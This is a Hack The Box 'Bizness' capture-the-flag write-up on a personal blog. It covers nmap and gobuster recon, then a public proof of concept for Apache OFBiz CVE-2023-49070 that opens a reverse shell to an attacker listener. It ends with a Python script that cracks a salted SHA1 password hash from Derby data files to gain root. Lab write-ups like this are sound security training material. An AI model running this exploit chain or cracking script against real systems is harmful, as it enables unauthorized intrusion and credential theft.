@@ -1,0 +1,126 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Bizness | foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Bizness</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-05-29T23:43:08.000Z" id="date"> 2024-05-30</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-01-26T18:53:33.357Z" id="updated"> 2025-01-26</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 20px;">
+
+  <!-- Image Section -->
+  <div style="flex: 1 1 auto; max-width: 300px; text-align: center;" class='item-img' data-src='bizness.webp'><img src="bizness.webp" title="Bizness" width="300px" height="300px" style="pointer-events: none; max-width: 100%; height: auto;">
+  </div>
+
+  <!-- Details Section -->
+  <div style="flex: 1 1 300px; display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Linux</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>C4rm3l0</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>January 6, 2024</span>
+    </div>
+  </div>
+
+</div>
+
+<style>
+  @media (max-width: 600px) {
+    div[style*="display: flex; flex-wrap: wrap;"] {
+      flex-direction: column;
+      align-items: center;
+    }
+
+    div[style*="flex: 1 1 auto;"] {
+      max-width: 100%;
+      text-align: center;
+    }
+
+    div[style*="flex: 1 1 300px;"] {
+      flex: 1 1 auto;
+      max-width: 100%;
+    }
+  }
+</style>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.11.252 -o nmap_scan<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-06 20:03 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.252<br>Host is up (0.062s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT    STATE SERVICE  VERSION<br>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)<br>|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)<br>|_  256 b0:6f:a0:0a:9e:<span class="hljs-built_in">df</span>:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)<br>80/tcp  open  http     nginx 1.18.0<br>|_http-server-header: nginx/1.18.0<br>|_http-title: Did not follow redirect to https://bizness.htb/<br>443/tcp open  ssl/http nginx 1.18.0<br>| tls-alpn: <br>|_  http/1.1<br>| tls-nextprotoneg: <br>|_  http/1.1<br>|_http-title: Did not follow redirect to https://bizness.htb/<br>|_http-server-header: nginx/1.18.0<br>| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK<br>| Not valid before: 2023-12-14T20:03:40<br>|_Not valid after:  2328-11-10T20:03:40<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.89 seconds<br><br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">HTTP</td>
+</tr>
+<tr>
+<td align="center">443</td>
+<td align="center">HTTPS</td>
+</tr>
+</tbody></table>
+<h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gobuster <span class="hljs-built_in">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://bizness.htb/ -k --exclude-length 0<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     https://bizness.htb/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] Exclude Length:          0<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/control              (Status: 200) [Size: 34633]<br><br></code></pre></td></tr></table></figure>
+
+<p>Found &#x2F;control directory<br class='item-img' data-src='/HTB/Bizness/control.png'><img src="/HTB/Bizness/control.png"></p>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="ofbiz"><a href="#ofbiz" class="headerlink" title="ofbiz"></a>ofbiz</h3><p>We now know ofbiz is running on the webserver.<br>Doing some googling, I found this <a target="_blank" rel="noopener" href="https://socprime.com/blog/cve-2023-49070-exploit-detection-a-critical-pre-auth-rce-vulnerability-in-apache-ofbiz/">CVE</a>.<br>By using this <a target="_blank" rel="noopener" href="https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC">POC</a> we can get a shell.</p>
+<p>First make sure you are using openjdk 11</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ update-alternatives --config java<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Bizness/java.png'><img src="/HTB/Bizness/java.png"></p>
+<p>Then start a listener and run the POC</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 exploit.py https://bizness.htb/ shell 10.10.14.4:1337<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Bizness/shell.png'><img src="/HTB/Bizness/shell.png"></p>
+<p>Now just get the user flag</p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="Hash-Decrypt"><a href="#Hash-Decrypt" class="headerlink" title="Hash Decrypt"></a>Hash Decrypt</h3><p>Looking through ofbiz files, I came accross a directory with a huge list of .dat files.<br class='item-img' data-src='/HTB/Bizness/datfiles.png'><img src="/HTB/Bizness/datfiles.png"></p>
+<p>By running strings on this directory and grepping for the word “Password”, we get a hashed password.</p>
+<blockquote>
+<p>Directory: &#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ strings * | grep Password<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Bizness/hash.png'><img src="/HTB/Bizness/hash.png"></p>
+<p>With the following python script, we can decrypt this hash.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Function to hash a value using SHA1 with a provided salt</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha1_hash_with_salt</span>(<span class="hljs-params">value, salt</span>):<br>    hash_obj = hashlib.sha1()<br>    hash_obj.update(salt.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    hash_obj.update(value.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> hash_obj.digest()<br><br><span class="hljs-comment"># Function to check if a hashed value matches a target hash</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_hash</span>(<span class="hljs-params">wordlist_file, target_hash, salt</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(wordlist_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;latin-1&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            password = line.strip()<br>            hashed_password = sha1_hash_with_salt(password, salt)<br>            encoded_hashed_password = base64.urlsafe_b64encode(hashed_password).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> encoded_hashed_password == target_hash:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Found Password: <span class="hljs-subst">&#123;password&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Password not found in the wordlist.&#x27;</span>)<br><br><span class="hljs-comment"># Define the target hash and salt</span><br>target_hash = <span class="hljs-string">&#x27;uP0_QaVBpDWFeo8-dRzDqRwXQ2I&#x27;</span>  <span class="hljs-comment"># Remove &quot;$SHA1$d$&quot; and use only the hash value</span><br>salt = <span class="hljs-string">&#x27;d&#x27;</span><br><br><span class="hljs-comment"># Replace wordlist_file with the path to your wordlist</span><br>wordlist_file = <span class="hljs-string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span><br><br><span class="hljs-comment"># Call the function to check the hash against the wordlist</span><br>check_hash(wordlist_file, target_hash, salt)<br><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/HTB/Bizness/decrypt.png'><img src="/HTB/Bizness/decrypt.png"></p>
+<p>This is the root password, just su to root and get the root flag<br class='item-img' data-src='/HTB/Bizness/rootflag.png'><img src="/HTB/Bizness/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Sightless/">← Next [HTB] Sightless</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/picoCTF/picoCTF2024/">picoCTF 2024 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'foguh' Ferreira</a></h1><div id="description"><p>SOC Analyst</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gobuster"><span class="toc-number">1.2.</span> <span class="toc-text">Gobuster</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ofbiz"><span class="toc-number">2.1.</span> <span class="toc-text">ofbiz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">3.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Decrypt"><span class="toc-number">3.1.</span> <span class="toc-text">Hash Decrypt</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
